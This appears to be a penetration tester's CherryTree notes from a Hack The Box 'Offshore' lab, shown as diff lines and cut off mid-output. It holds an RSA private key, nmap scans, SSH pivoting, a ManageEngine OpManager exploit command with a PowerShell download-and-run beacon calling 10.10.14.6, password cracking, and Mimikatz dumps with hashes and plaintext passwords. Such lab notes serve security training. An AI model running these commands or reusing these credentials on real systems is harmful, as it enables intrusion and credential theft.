+HTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4
+gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyT
+Td7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJH
+LE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fb
+v1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oG
+eAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4U
+MAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9
+KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AX
+j5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1L
+H6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7
+VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx
+5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeL
+Ku73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PM
+l1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ7
+8aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB
+/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxK
+CS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/Uk
+pnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE
+-----END RSA PRIVATE KEY-----
+
+
+
+
+
+</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Narrative" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569932041.29" ts_lastsave="1569932044.63" unique_id="12">
+					<rich_text>System is hosting Splunk
+Uploaded Splunk Web Shell App
+Connected to Metasploit as use Mark
+Identified a Postgres user account
+Connected to PostgreSQL to query database; nothing found
+Found Postgres command execution script
+Executed reverse shell back to myself (Postgres User)
+Identified Postgres user has sudo rights to tail files
+Tail'd the root ssh id_rsa private key
+SSH using the private key as root</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569853346.18" ts_lastsave="1569932347.73" unique_id="9">
+					<rich_text>Starting Nmap 7.80 ( </rich_text>
+					<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+					<rich_text> ) at 2019-09-30 11:04 EDT
+        Nmap scan report for 10.10.110.123
+        Host is up (0.039s latency).
+        Not shown: 996 filtered ports
+        PORT     STATE SERVICE  VERSION
+        22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+        | ssh-hostkey: 
+        |   2048 ed:da:93:ee:2e:2b:7a:02:4d:97:3d:1b:f2:40:ba:f6 (RSA)
+        |   256 7e:de:fa:0c:9d:4c:6c:01:7c:0a:0c:f1:74:4d:f3:5f (ECDSA)
+        |_  256 15:ab:fc:b8:a2:fa:f1:57:d7:3f:bc:ab:ad:d0:cc:99 (ED25519)
+        80/tcp   open  http     Apache httpd 2.4.18 ((Ubuntu))
+        |_http-server-header: Apache/2.4.18 (Ubuntu)
+        |_http-title: ACME Bank
+        8000/tcp open  http     Splunkd httpd
+        | http-robots.txt: 1 disallowed entry 
+        |_/
+        |_http-server-header: Splunkd
+        | http-title: Site doesn't have a title (text/html; charset=UTF-8).
+        |_Requested resource was </rich_text>
+					<rich_text link="webs http://10.10.110.123:8000/en-US/account/login?return_to=%2Fen-US%2F">http://10.10.110.123:8000/en-US/account/login?return_to=%2Fen-US%2F</rich_text>
+					<rich_text>
+        8089/tcp open  ssl/http Splunkd httpd (free license; remote login disabled)
+        | http-auth: 
+        | HTTP/1.1 401 Unauthorized\x0D
+        |_  Server returned status 401 but no WWW-Authenticate header.
+        |_http-server-header: Splunkd
+        |_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
+        | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+        | Not valid before: 2018-02-02T20:26:16
+        |_Not valid after:  2021-02-01T20:26:16
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</rich_text>
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="CORP.LOCAL" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569934927.83" ts_lastsave="1571783294.79" unique_id="16">
+			<rich_text>#Initial SSH into DMZ
+ssh root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+
+#Proxy Chains to Corp Network
+ssh -D 9050 root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+or
+#SSH Port Forward
+ssh -L 127.0.0.1:8000:172.16.1.30:80 root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+
+#Nmap network
+for i in $(cat ~/htb/offshore/Internal/temp/iplist); do proxychains nmap -n -Pn -sC -sV $i -oA nmap_$i; done
+
+
+username=admin&amp;flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&amp;password=Zaq12wsx!
+Flag: OFFSHORE{l0v3_cl3artext_pr0toc0l$}
+
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="MS01" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569956735.36" ts_lastsave="1571227966.37" unique_id="23">
+				<rich_text>IP: 172.16.1.30
+
+Software Installed: ManageEngine OpManager (Possible version 12.3)
+
+Found password running a Tcpdump TCP/80 on 10.10.110.123
+admin:Zaq12wsx!
+
+Logged into admin panel with credentials above
+
+Found Rest API Key in Basic Settings: e9ea1e162f47f8922f130093c612e9fc (Did not use this)
+
+Found exploit that runs commands
+    - ManageEngine opManager 12.3.150 - Authenticated Code Execution  | exploits/windows/webapps/47255.py
+    
+    BEACON
+    - proxychains python3 /home/user/htb/offshore/Internal/MS01/exploits/47255.py -u admin -t </rich_text>
+				<rich_text link="webs http://172.16.1.30">http://172.16.1.30</rich_text>
+				<rich_text> -p Zaq12wsx! -c &quot;powershell.exe iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<rich_text>
+    
+
+Found logins.xlsx - C:\users\administrator.ADMIN.000\Documents\logins.xlsx
+Cracked password protected xls
+    - python /usr/share/john/office2john.py logins.xlsx &gt; hash.txt
+    - john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+    - john hash.txt --show
+        - logins.xlsx:broken
+    
+    Excel Contents:
+    </rich_text>
+				<rich_text justification="left"></rich_text>
+				<rich_text>
+
+DPAPI Password: 
+  - Found with SharpDPAPI machinetriage
+Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+  CredFile                   : 7EDD2F81A942D6C589A1471E0591A31C
+
+    guidMasterKey       : {7ddbd4ee-c6fd-4303-9997-8dc27f219b95}
+    size                       : 576
+    flags                      : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt   : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description            : Local Credential Data
+    LastWritten            : 9/5/2018 12:41:38 PM
+    TargetName           : Domain:batch=TaskScheduler:Task:{6CB48ECD-1BF1-4AD7-9E73-5CEA4D757104}
+    UserName              : CORP\svc_opmanager
+    Credential               : Manage my engine 123!
+
+</rich_text>
+				<table char_offset="1001" col_max="400" col_min="40">
+					<row>
+						<cell>Account</cell>
+						<cell>Username</cell>
+						<cell>Pass</cell>
+						<cell>Notes</cell>
+					</row>
+					<row>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>Network login</cell>
+						<cell>ned.flanders_adm</cell>
+						<cell>Lefthandedyeah!</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>Email</cell>
+						<cell>ned.flanders@offshore.com</cell>
+						<cell>Lefty1974!</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>Bank</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>https://citibank.com</cell>
+						<cell>991103</cell>
+						<cell>0419!094Ar</cell>
+						<cell>
+</cell>
+					</row>
+					<row>
+						<cell>click me</cell>
+						<cell>click me</cell>
+						<cell>click me</cell>
+						<cell>click me</cell>
+					</row>
+				</table>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569978078.96" ts_lastsave="1569978110.43" unique_id="24">
+					<rich_text># Nmap 7.80 scan initiated Tue Oct  1 11:13:05 2019 as: nmap -n -Pn -sC -sV -oA nmap_172.16.1.30 172.16.1.30
+Nmap scan report for 172.16.1.30
+Host is up (0.040s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-Network ConfigManager SCP Server
+| ssh-hostkey: 
+|   1024 a2:ab:0c:3d:3a:3c:cb:98:16:b8:5e:d3:5d:65:11:79 (DSA)
+|_  1024 3d:3b:65:bd:9e:27:18:2a:09:f6:6c:72:05:07:6d:04 (RSA)
+80/tcp   open  http
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Cache-Control: private
+|     Expires: Wed, 31 Dec 1969 19:00:00 EST
+|     Set-Cookie: JSESSIONID=7D5816214277CD58DF63947EBB0826C5; Path=/; HttpOnly
+|     X-Frame-Options: DENY
+|     Content-Type: text/html;charset=UTF-8
+|     Vary: Accept-Encoding
+|     Date: Tue, 01 Oct 2019 15:11:22 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;</rich_text>
+					<rich_text link="webs http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</rich_text>
+					<rich_text>
+|     &lt;html xmlns=&quot;</rich_text>
+					<rich_text link="webs http://www.w3.org/1999/xhtml&quot;&gt;">http://www.w3.org/1999/xhtml&quot;&gt;</rich_text>
+					<rich_text>
+|     &lt;head&gt;
+|     &lt;!--[if IE]&gt;&lt;meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1' /&gt;&lt;![endif]--&gt;
+|     &lt;script&gt;
+|     sessionStorage.clear();
+|     ntlm = false;
+|     &lt;/script&gt;
+|     &lt;input type=&quot;hidden&quot; id=&quot;loadCookieMethod&quot; value=&quot;true&quot;&gt;
+|     &lt;title&gt;
+|     ManageEngine OpManager
+|     &lt;/title&gt;
+|     &lt;script type=&quot;text/javascript&quot;&gt;
+|     function GetXmlHttpObject()
+|     objXMLHttp=null
+|     (window.XMLHttpReque
+|   HTTPOptions: 
+|     HTTP/1.1 403 
+|     Cache-Control: private
+|     Expires: Wed, 31 Dec 1969 19:00:00 EST
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1056
+|     Vary: Accept-Encoding
+|     Date: Tue, 01 Oct 2019 15:11:22 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 403 
+|_    Forbidden&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {colo
+|_http-title: ManageEngine OpManager
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+2000/tcp open  cisco-sccp?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: CORP
+|   NetBIOS_Domain_Name: CORP
+|   NetBIOS_Computer_Name: MS01
+|   DNS_Domain_Name: corp.local
+|   DNS_Computer_Name: MS01.corp.local
+|   DNS_Tree_Name: corp.local
+|   Product_Version: 10.0.14393
+|_  System_Time: 2019-10-01T15:13:59+00:00
+| ssl-cert: Subject: commonName=MS01.corp.local
+| Not valid before: 2019-09-30T06:10:58
+|_Not valid after:  2020-03-31T06:10:58
+|_ssl-date: 2019-10-01T15:14:15+00:00; -2m31s from scanner time.
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at </rich_text>
+					<rich_text link="webs https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</rich_text>
+					<rich_text> :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.80%I=7%D=10/1%Time=5D936D30%P=x86_64-pc-linux-gnu%r(NULL
+SF:,2A,&quot;SSH-2\.0-Network\x20ConfigManager\x20SCP\x20Server\r\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.80%I=7%D=10/1%Time=5D936D30%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,2000,&quot;HTTP/1\.1\x20200\x20\r\nCache-Control:\x20private\r\nExpir
+SF:es:\x20Wed,\x2031\x20Dec\x201969\x2019:00:00\x20EST\r\nSet-Cookie:\x20J
+SF:SESSIONID=7D5816214277CD58DF63947EBB0826C5;\x20Path=/;\x20HttpOnly\r\nX
+SF:-Frame-Options:\x20DENY\r\nContent-Type:\x20text/html;charset=UTF-8\r\n
+SF:Vary:\x20Accept-Encoding\r\nDate:\x20Tue,\x2001\x20Oct\x202019\x2015:11
+SF::22\x20GMT\r\nConnection:\x20close\r\n\r\n\n&lt;!DOCTYPE\x20html\x20PUBLIC
+SF:\x20\&quot;-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN\&quot;\x20\&quot;</rich_text>
+					<rich_text link="webs http://ww">http://ww</rich_text>
+					<rich_text>
+SF:w\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\.dtd\&quot;&gt;\n&lt;html\x20xmlns=\&quot;
+SF:</rich_text>
+					<rich_text link="webs http://www\.w3\.org/1999/xhtml\&quot;&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n">http://www\.w3\.org/1999/xhtml\&quot;&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n</rich_text>
+					<rich_text>
+SF:\n\n\n\n\n\n\n\n\n\n\n\n\t&lt;head&gt;\n\t&lt;!--\[if\x20IE\]&gt;&lt;meta\x20http-equi
+SF:v='X-UA-Compatible'\x20content='IE=edge,chrome=1'\x20/&gt;&lt;!\[endif\]--&gt;\n
+SF:\t&lt;script&gt;\n\t\tsessionStorage\.clear\(\);\n\t\tvar\x20ntlm\x20=\x20fal
+SF:se;\n\t&lt;/script&gt;\n\n\t\t\t&lt;input\x20type=\&quot;hidden\&quot;\x20id=\&quot;loadCookieM
+SF:ethod\&quot;\x20value=\&quot;true\&quot;&gt;\n\t&lt;title&gt;\n\t\t\n\t\t\n\t\t\n\t\t\tManageEn
+SF:gine\x20OpManager\n\t\t\n\t\t\n\t&lt;/title&gt;\n\n\n\n\n\n&lt;script\x20type=\&quot;
+SF:text/javascript\&quot;&gt;\n\nfunction\x20GetXmlHttpObject\(\)\n{\x20\n\x20\x20
+SF:\x20\x20var\x20objXMLHttp=null\n\x20\x20\x20\x20if\x20\(window\.XMLHttp
+SF:Reque&quot;)%r(HTTPOptions,513,&quot;HTTP/1\.1\x20403\x20\r\nCache-Control:\x20pr
+SF:ivate\r\nExpires:\x20Wed,\x2031\x20Dec\x201969\x2019:00:00\x20EST\r\nCo
+SF:ntent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\nCo
+SF:ntent-Length:\x201056\r\nVary:\x20Accept-Encoding\r\nDate:\x20Tue,\x200
+SF:1\x20Oct\x202019\x2015:11:22\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!do
+SF:ctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20403\x
+SF:20\xe2\x80\x93\x20Forbidden&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;h1\x20{f
+SF:ont-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76
+SF:;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:w
+SF:hite;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Ta
+SF:homa,Arial,sans-serif;color:white;background-color:#525D76;font-size:14
+SF:px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgr
+SF:ound-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:w
+SF:hite;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-
+SF:serif;background:white;color:black;font-size:12px;}\x20a\x20{color:blac
+SF:k;}\x20a\.name\x20{colo&quot;);
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -2m30s, deviation: 0s, median: -2m31s
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-10-01T15:14:02
+|_  start_date: 2019-10-01T06:11:01
+
+Service detection performed. Please report any incorrect results at </rich_text>
+					<rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+					<rich_text> .
+# Nmap done at Tue Oct  1 11:16:47 2019 -- 1 IP address (1 host up) scanned in 221.61 seconds</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Credentials" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570062537.41" ts_lastsave="1570208893.75" unique_id="27">
+					<rich_text>8846f7eaee8fb117ad06bdd830b7586c    password       MS01\test
+13b29964cc2480b4ef454c59562e675c    P@ssword      MS01\jsmith
+7facdc498ed1680c4fd1448319a8c04f      Password1!    MS01\Administrator
+
+CORP
+ned.flanders_adm:Lefthandedyeah! - Email ned.flanders@offshore Pass: Lefty1974!
+svc_opmanager:Manage my engine 123!</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="WSADM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570283985.92" ts_lastsave="1571861184.16" unique_id="15">
+				<rich_text>IP: 172.16.1.36
+
+RDP through proxychains to WSADM
+    - proxychains xfreerdp /u:ned.flanders_adm /p:Lefthandedyeah! /d:corp /size:80% /v:172.16.1.36
+    - System has weird key stokes when I type
+    - Pasting text into the VM works fine
+    
+BEACON: powershell.exe iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')">http://10.10.14.6/update')</rich_text>
+				<rich_text>
+ 
+ - Executed powershell beacon from Admin Powershell
+ 
+ - Becon returned in medium integerity context but did contain SeDebugPrvilege Access. Used this for privesc. 
+ 
+ GOT HASHES
+ - Executed Mimikatz sekurlsa::minidump mydump
+ - Executed Mimikatz sekurlsa::LogonPasswords
+ 
+ Creds:
+ wsadmin:669b12a3bac275251170afbe2c5de8c2
+ </rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Creds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570561502.5" ts_lastsave="1570561783.9" unique_id="19">
+					<rich_text>Authentication Id : 0 ; 21424710 (00000000:0146ea46)
+Session           : CachedInteractive from 2
+User Name         : ned.flanders_adm
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 2:30:53 PM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
+	msv :	
+	 [00000003] Primary
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
+	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
+	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
+	tspkg :	
+	wdigest :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP.LOCAL
+	 * Password : Lefthandedyeah!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 21264945 (00000000:01447a31)
+Session           : CachedInteractive from 2
+User Name         : ned.flanders_adm
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 2:29:04 PM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
+	msv :	
+	 [00000003] Primary
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
+	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
+	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
+	tspkg :	
+	wdigest :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP.LOCAL
+	 * Password : Lefthandedyeah!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 21158523 (00000000:0142da7b)
+Session           : CachedInteractive from 2
+User Name         : ned.flanders_adm
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 2:27:16 PM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
+	msv :	
+	 [00000003] Primary
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
+	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
+	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
+	tspkg :	
+	wdigest :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP.LOCAL
+	 * Password : Lefthandedyeah!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 19783405 (00000000:012ddeed)
+Session           : CachedInteractive from 2
+User Name         : ned.flanders_adm
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 2:02:53 PM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
+	msv :	
+	 [00000003] Primary
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
+	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
+	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
+	tspkg :	
+	wdigest :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP.LOCAL
+	 * Password : Lefthandedyeah!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6756672 (00000000:00671940)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/8/2019 8:08:34 AM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6756649 (00000000:00671929)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/8/2019 8:08:34 AM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6755039 (00000000:006712df)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/8/2019 8:08:34 AM
+SID               : S-1-5-96-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : WSADM$
+	 * Domain   : corp.local
+	 * Password : M9f,Dzf*5tM9&gt;'BjGhH`;KETEKLcQ;K&amp;NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB&quot;a&gt;+U^&lt;z`j'Ca&quot;TZV=fm+BBDW&amp;t/?0Hm)R&gt;)ZkcswFkz:8PQFp*b!&gt;4
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6742701 (00000000:0066e2ad)
+Session           : RemoteInteractive from 2
+User Name         : ned.flanders_adm
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 8:08:01 AM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
+	msv :	
+	 [00000003] Primary
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
+	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
+	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
+	tspkg :	
+	wdigest :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6742660 (00000000:0066e284)
+Session           : RemoteInteractive from 2
+User Name         : ned.flanders_adm
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 10/8/2019 8:08:01 AM
+SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
+	msv :	
+	 [00000003] Primary
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
+	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
+	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
+	tspkg :	
+	wdigest :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ned.flanders_adm
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 6731984 (00000000:0066b8d0)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/8/2019 8:08:01 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : WSADM$
+	 * Domain   : CORP
+	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
+	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
+	tspkg :	
+	wdigest :	
+	 * Username : WSADM$
